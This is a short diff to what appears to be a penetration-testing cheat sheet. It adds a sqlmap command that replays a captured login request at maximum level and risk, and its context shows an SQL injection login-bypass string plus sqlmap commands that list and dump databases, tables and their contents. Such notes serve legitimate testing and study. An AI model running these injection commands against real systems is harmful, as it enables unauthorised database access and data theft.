@@ -176,6 +176,8 @@ admin’;--
 
 # sqlmap
 
+sqlmap -r login.txt --level 5 --risk 3       # Captured login using Burp
+ 
 sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch                # Show all dbs
 sqlmap -u "http://target/index.html?page=1" -D <db> --tables --dump --batch     # Show all tables in a particular db
 sqlmap -u "http://target/index.html?page=1" -D <db> -T <table> --dump           # Dump all data in a particular table
